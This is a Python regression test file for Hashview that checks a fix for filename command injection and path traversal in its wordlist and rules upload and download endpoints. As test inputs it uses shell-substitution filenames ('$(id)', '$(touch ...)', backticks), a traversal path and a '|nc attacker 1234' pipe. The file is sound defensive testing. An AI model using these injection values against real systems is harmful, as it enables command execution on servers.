"""Security regression tests for the wordlist/rules filename command-injection
report (GHSA / tonghuaroot).

Two layers are covered:

* ``save_file`` must never let an attacker-controlled upload filename reach the
  on-disk name (CWE-22 path traversal / CWE-78 command-injection source).
* the ``/v1/rules/<id>`` and ``/v1/wordlists/<id>`` download endpoints must gzip
  the file WITHOUT invoking a shell, so a malicious stored path cannot execute
  commands (CWE-78 sink).

The download tests plant a source file whose basename is a shell
command-substitution payload and assert the sentinel command never runs.
"""

import gzip
import os
import re

import hashview.utils.utils as u
from hashview.models import Rules, Users, Wordlists, db


def _api_user():
    user = Users(first_name="A", last_name="B", email_address="a@e.com",
                 password="x", admin=True, api_key="test-api-key")
    db.session.add(user)
    db.session.commit()
    return user


def _seed_source(app, subdir, payload_name, content=b"body\n"):
    src = os.path.join(app.root_path, "control", subdir, payload_name)
    with open(src, "wb") as f:
        f.write(content)
    return src


# --- save_file source hardening --------------------------------------------

def test_save_file_ignores_attacker_controlled_filename(app):
    """The uploaded filename is attacker-controlled and must be discarded: the
    on-disk name is a random ``<hex>.txt`` and the write stays inside the target
    directory (no traversal), regardless of separators/metacharacters."""
    class _EvilFile:
        def __init__(self, filename):
            self.filename = filename

        def save(self, dst):
            with open(dst, "wb") as fh:
                fh.write(b"payload")

    control_tmp = os.path.realpath(os.path.join(app.root_path, "control", "tmp"))
    for evil in ["$(id)/x.txt", "../../../../tmp/evil/y.txt", "a;touch pwned;.txt",
                 "`whoami`/z", "|nc attacker 1234/x"]:
        path = u.save_file("control/tmp", _EvilFile(evil))
        try:
            assert re.fullmatch(r"[0-9a-f]{16}\.txt", os.path.basename(path)), path
            assert os.path.realpath(path).startswith(control_tmp + os.sep)
            assert os.path.exists(path)
        finally:
            if os.path.exists(path):
                os.remove(path)


# --- download sinks must not reach a shell (CWE-78) -------------------------

def test_rules_download_does_not_execute_shell(app, client):
    user = _api_user()
    sentinel = "pwned_rules_sentinel"
    payload_name = "$(touch " + sentinel + ").txt"
    src = _seed_source(app, "rules", payload_name)
    rule = Rules(name="evil", owner_id=user.id,
                 path="control/rules/" + payload_name, checksum="x")
    db.session.add(rule)
    db.session.commit()
    client.set_cookie("uuid", "test-api-key")
    gz_leftover = os.path.join(app.root_path, "control", "tmp", payload_name + ".gz")
    try:
        resp = client.get(f"/v1/rules/{rule.id}")
        assert resp.status_code == 200
        assert not os.path.exists(sentinel)                 # no shell command executed
        assert gzip.decompress(resp.data) == b"body\n"       # served the gz of the source
    finally:
        for p in (src, gz_leftover, sentinel):
            if os.path.exists(p):
                os.remove(p)


def test_wordlist_download_does_not_execute_shell(app, client):
    user = _api_user()
    sentinel = "pwned_wl_sentinel"
    payload_name = "$(touch " + sentinel + ").txt"
    src = _seed_source(app, "wordlists", payload_name)
    wl = Wordlists(name="evil", owner_id=user.id, size=0,
                   path="control/wordlists/" + payload_name, checksum="x")
    db.session.add(wl)
    db.session.commit()
    client.set_cookie("uuid", "test-api-key")
    tmp_dir = os.path.join(app.root_path, "control", "tmp")
    try:
        resp = client.get(f"/v1/wordlists/{wl.id}")
        assert resp.status_code == 200
        assert not os.path.exists(sentinel)
        assert gzip.decompress(resp.data) == b"body\n"
    finally:
        for fn in os.listdir(tmp_dir):                       # gz name has a random suffix
            if fn.startswith(payload_name):
                os.remove(os.path.join(tmp_dir, fn))
        for p in (src, sentinel):
            if os.path.exists(p):
                os.remove(p)
